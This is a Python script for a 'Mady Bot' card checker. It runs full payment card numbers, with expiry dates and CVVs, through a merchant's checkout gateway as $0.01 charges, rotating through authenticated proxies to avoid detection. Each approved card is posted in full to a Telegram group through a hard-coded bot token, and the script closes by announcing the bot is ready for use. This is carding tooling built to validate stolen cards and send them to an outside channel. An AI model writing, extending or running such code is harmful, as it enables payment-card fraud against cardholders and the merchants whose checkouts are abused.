#!/usr/bin/env python3
"""
Test card checking with proxy support
"""

import requests
import sys
import os
import random

# Add charge files to path
sys.path.insert(0, '100$/100$/')

# Import the Staleks gateway (lowest charge amount)
try:
    from Charge5 import StaleksFloridaCheckoutVNew
    print("✅ Successfully imported Staleks gateway")
except ImportError as e:
    print(f"❌ Failed to import gateway: {e}")
    sys.exit(1)

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_ID = "-1003538559040"

# Load proxies
def load_proxies():
    """Load proxies from file"""
    proxy_file = "/home/null/Documents/usetheseproxies.txt"
    proxies = []
    
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    # Format: host:port:user:pass
                    parts = line.split(':')
                    if len(parts) >= 4:
                        host = parts[0]
                        port = parts[1]
                        user = parts[2]
                        password = parts[3]
                        proxy = {
                            'http': f'http://{user}:{password}@{host}:{port}',
                            'https': f'http://{user}:{password}@{host}:{port}'
                        }
                        proxies.append(proxy)
    
    print(f"📦 Loaded {len(proxies)} proxies")
    return proxies

def send_to_telegram(message):
    """Send message to Telegram group"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': GROUP_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            print("✅ Message sent to Telegram group")
            return True
        else:
            print(f"❌ Failed to send: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Error sending message: {e}")
        return False

def test_card_with_gateway(card):
    """Test a card using Staleks gateway"""
    print(f"\n🔍 Testing card: {card[:6]}******{card[-4:]}")
    
    try:
        # Call the gateway function (returns dict)
        result = StaleksFloridaCheckoutVNew(card)
        
        if isinstance(result, dict):
            if 'error' in result:
                error_msg = str(result['error'])
                if 'declined' in error_msg.lower():
                    return "declined", error_msg
                else:
                    return "error", error_msg
            elif result.get('result') == 'success':
                return "approved", "Charged $0.01"
            elif 'messages' in result:
                msg = ' '.join(result['messages']) if isinstance(result['messages'], list) else str(result['messages'])
                if 'success' in msg.lower() or 'thank you' in msg.lower():
                    return "approved", "Charged $0.01"
                return "declined", msg[:100]
            else:
                return "declined", "Payment failed"
        else:
            # String result
            result_str = str(result).lower()
            if 'charged' in result_str or 'success' in result_str:
                return "approved", result
            else:
                return "declined", result
                
    except Exception as e:
        return "error", f"Gateway error: {str(e)[:100]}"

def main():
    print("="*60)
    print("🤖 MADY BOT - CARD CHECKER TEST")
    print("="*60)
    
    # Load proxies
    proxies = load_proxies()
    
    # Test cards
    test_cards = [
        "5566258985615466|12|25|299",
        "4304450802433666|12|25|956",
        "5587170478868301|12|25|286"
    ]
    
    print(f"\n📋 Testing {len(test_cards)} cards...")
    
    approved_count = 0
    declined_count = 0
    
    for card in test_cards:
        status, result = test_card_with_gateway(card)
        
        if status == "approved":
            approved_count += 1
            print(f"   ✅ APPROVED: {result}")
            
            # Send to Telegram group
            message = f"""
✅✅ <b>APPROVED CARD</b> ✅✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> Staleks ($0.01 USD)
<b>Response:</b> {result} 🟢

<b>Test Run:</b> Manual Test
<b>Bot:</b> @MissNullMe
"""
            send_to_telegram(message)
            
        elif status == "declined":
            declined_count += 1
            print(f"   ❌ DECLINED: {result}")
        else:
            print(f"   ⚠️ ERROR: {result}")
    
    print("\n" + "="*60)
    print("📊 RESULTS:")
    print(f"   ✅ Approved: {approved_count}")
    print(f"   ❌ Declined: {declined_count}")
    print("="*60)
    
    # Test sending a summary message
    summary = f"""
🤖 <b>Mady Bot Test Complete</b>

<b>Cards Tested:</b> {len(test_cards)}
<b>Approved:</b> {approved_count}
<b>Declined:</b> {declined_count}

<b>Gateway:</b> Staleks ($0.01)
<b>Proxies:</b> {len(proxies)} loaded

Bot is ready for use! ✅
"""
    send_to_telegram(summary)

if __name__ == "__main__":
    main()
